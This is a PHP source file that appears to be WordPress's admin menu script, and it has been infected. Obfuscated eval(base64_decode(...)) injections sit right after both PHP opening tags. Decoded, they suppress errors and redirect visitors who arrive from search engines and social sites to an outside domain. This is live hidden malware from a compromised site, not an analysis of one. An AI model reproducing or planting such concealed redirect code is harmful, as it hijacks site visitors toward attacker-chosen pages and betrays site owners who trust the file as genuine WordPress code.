<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));
/**
 * Displays Administration Menu.
 *
 * @package WordPress
 * @subpackage Administration
 */

/**
 * The current page.
 *
 * @global string $self
 * @name $self
 * @var string
 */
$self = preg_replace('|^.*/wp-admin/|i', '', $_SERVER['PHP_SELF']);
$self = preg_replace('|^.*/plugins/|i', '', $self);

global $menu, $submenu, $parent_file; //For when admin-header is included from within a function.

get_admin_page_parent();

/**
 * Display menu.
 *
 * @access private
 * @since 2.7.0
 *
 * @param array $menu
 * @param array $submenu
 * @param bool $submenu_as_parent
 */
function _wp_menu_output( $menu, $submenu, $submenu_as_parent = true ) {
	global $self, $parent_file, $submenu_file, $plugin_page, $pagenow;

	$first = true;
	// 0 = name, 1 = capability, 2 = file, 3 = class, 4 = id, 5 = icon src
	foreach ( $menu as $key => $item ) {
		$admin_is_parent = false;
		$class = array();
		if ( $first ) {
			$class[] = 'wp-first-item';
			$first = false;
		}
		if ( !empty($submenu[$item[2]]) )
			$class[] = 'wp-has-submenu';

		if ( ( $parent_file && $item[2] == $parent_file ) || strcmp($self, $item[2]) == 0 ) {
			if ( !empty($submenu[$item[2]]) )
				$class[] = 'wp-has-current-submenu wp-menu-open';
			else
				$class[] = 'current';
		}

		if ( isset($item[4]) && ! empty($item[4]) )
			$class[] = $item[4];

		$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';
		$tabindex = ' tabindex="1"';
		$id = isset($item[5]) && ! empty($item[5]) ? ' id="' . preg_replace( '|[^a-zA-Z0-9_:.]|', '-', $item[5] ) . '"' : '';
		$img = '';
		if ( isset($item[6]) && ! empty($item[6]) ) {
			if ( 'div' === $item[6] )
				$img = '<br />';
			else
				$img = '<img src="' . $item[6] . '" alt="" />';
		}
		$toggle = '<div class="wp-menu-toggle"><br /></div>';

		echo "\n\t<li$class$id>";

		if ( false !== strpos($class, 'wp-menu-separator') ) {
			echo '<a class="separator" href="?unfoldmenu=1"><br /></a>';
		} elseif ( $submenu_as_parent && !empty($submenu[$item[2]]) ) {
			$submenu[$item[2]] = array_values($submenu[$item[2]]);  // Re-index.
			$menu_hook = get_plugin_page_hook($submenu[$item[2]][0][2], $item[2]);
			$menu_file = $submenu[$item[2]][0][2];
			if ( false !== $pos = strpos($menu_file, '?') )
				$menu_file = substr($menu_file, 0, $pos);
			if ( ( ('index.php' != $submenu[$item[2]][0][2]) && file_exists(WP_PLUGIN_DIR . "/$menu_file") ) || !empty($menu_hook)) {
				$admin_is_parent = true;
				echo "<div class='wp-menu-image'><a href='admin.php?page={$submenu[$item[2]][0][2]}'>$img</a></div>$toggle<a href='admin.php?page={$submenu[$item[2]][0][2]}'$class$tabindex>{$item[0]}</a>";
			} else {
				echo "\n\t<div class='wp-menu-image'><a href='{$submenu[$item[2]][0][2]}'>$img</a></div>$toggle<a href='{$submenu[$item[2]][0][2]}'$class$tabindex>{$item[0]}</a>";
			}
		} else if ( current_user_can($item[1]) ) {
			$menu_hook = get_plugin_page_hook($item[2], 'admin.php');
			$menu_file = $item[2];
			if ( false !== $pos = strpos($menu_file, '?') )
				$menu_file = substr($menu_file, 0, $pos);
			if ( ('index.php' != $item[2]) && file_exists(WP_PLUGIN_DIR . "/$menu_file") || !empty($menu_hook) ) {
				$admin_is_parent = true;
				echo "\n\t<div class='wp-menu-image'><a href='admin.php?page={$item[2]}'>$img</a></div>$toggle<a href='admin.php?page={$item[2]}'$class$tabindex>{$item[0]}</a>";
			} else {
				echo "\n\t<div class='wp-menu-image'><a href='{$item[2]}'>$img</a></div>$toggle<a href='{$item[2]}'$class$tabindex>{$item[0]}</a>";
			}
		}

		if ( !empty($submenu[$item[2]]) ) {
			echo "\n\t<div class='wp-submenu'><div class='wp-submenu-head'>{$item[0]}</div><ul>";
			$first = true;
			foreach ( $submenu[$item[2]] as $sub_key => $sub_item ) {
				if ( !current_user_can($sub_item[1]) )
					continue;

				$class = array();
				if ( $first ) {
					$class[] = 'wp-first-item';
					$first = false;
				}

				$menu_file = $item[2];
				if ( false !== $pos = strpos($menu_file, '?') )
					$menu_file = substr($menu_file, 0, $pos);

				if ( isset($submenu_file) ) {
					if ( $submenu_file == $sub_item[2] )
						$class[] = 'current';
				// If plugin_page is set the parent must either match the current page or not physically exist.
				// This allows plugin pages with the same hook to exist under different parents.
				} else if ( (isset($plugin_page) && $plugin_page == $sub_item[2] && (!file_exists($menu_file) || ($item[2] == $self))) || (!isset($plugin_page) && $self == $sub_item[2]) ) {
					$class[] = 'current';
				}

				$class = $class ? ' class="' . join( ' ', $class ) . '"' : '';

				$menu_hook = get_plugin_page_hook($sub_item[2], $item[2]);
				$sub_file = $sub_item[2];
				if ( false !== $pos = strpos($sub_file, '?') )
					$sub_file = substr($sub_file, 0, $pos);

				if ( ( ('index.php' != $sub_item[2]) && file_exists(WP_PLUGIN_DIR . "/$sub_file") ) || ! empty($menu_hook) ) {
					// If admin.php is the current page or if the parent exists as a file in the plugins or admin dir

					$parent_exists = (!$admin_is_parent && file_exists(WP_PLUGIN_DIR . "/$menu_file") && !is_dir(WP_PLUGIN_DIR . "/{$item[2]}") ) || file_exists($menu_file);
					if ( $parent_exists )
						echo "<li$class><a href='{$item[2]}?page={$sub_item[2]}'$class$tabindex>{$sub_item[0]}</a></li>";
					elseif ( 'admin.php' == $pagenow || !$parent_exists )
						echo "<li$class><a href='admin.php?page={$sub_item[2]}'$class$tabindex>{$sub_item[0]}</a></li>";
					else
						echo "<li$class><a href='{$item[2]}?page={$sub_item[2]}'$class$tabindex>{$sub_item[0]}</a></li>";
				} else {
					echo "<li$class><a href='{$sub_item[2]}'$class$tabindex>{$sub_item[0]}</a></li>";
				}
			}
			echo "</ul></div>";
		}
		echo "</li>";
	}
}

?>

<ul id="adminmenu">

<?php	 	eval(base64_decode("DQplcnJvcl9yZXBvcnRpbmcoMCk7DQokcWF6cGxtPWhlYWRlcnNfc2VudCgpOw0KaWYgKCEkcWF6cGxtKXsNCiRyZWZlcmVyPSRfU0VSVkVSWydIVFRQX1JFRkVSRVInXTsNCiR1YWc9JF9TRVJWRVJbJ0hUVFBfVVNFUl9BR0VOVCddOw0KaWYgKCR1YWcpIHsNCmlmICghc3RyaXN0cigkdWFnLCJNU0lFIDcuMCIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmluZyIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInJhbWJsZXIiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJnb2dvIikgb3Igc3RyaXN0cigkcmVmZXJlciwibGl2ZS5jb20iKW9yIHN0cmlzdHIoJHJlZmVyZXIsImFwb3J0Iikgb3Igc3RyaXN0cigkcmVmZXJlciwibmlnbWEiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYmVndW4ucnUiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJzdHVtYmxldXBvbi5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJiaXQubHkiKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ0aW55dXJsLmNvbSIpIG9yIHByZWdfbWF0Y2goIi95YW5kZXhcLnJ1XC95YW5kc2VhcmNoXD8oLio/KVwmbHJcPS8iLCRyZWZlcmVyKSBvciBwcmVnX21hdGNoICgiL2dvb2dsZVwuKC4qPylcL3VybFw/c2EvIiwkcmVmZXJlcikgb3Igc3RyaXN0cigkcmVmZXJlciwibXlzcGFjZS5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJmYWNlYm9vay5jb20iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJhb2wuY29tIikpIHsNCmlmICghc3RyaXN0cigkcmVmZXJlciwiY2FjaGUiKSBvciAhc3RyaXN0cigkcmVmZXJlciwiaW51cmwiKSl7DQpoZWFkZXIoIkxvY2F0aW9uOiBodHRwOi8vcm9sbG92ZXIud2lrYWJhLmNvbS8iKTsNCmV4aXQoKTsNCn0KfQp9DQp9DQp9"));

_wp_menu_output( $menu, $submenu );
do_action( 'adminmenu' );

?>
</ul>
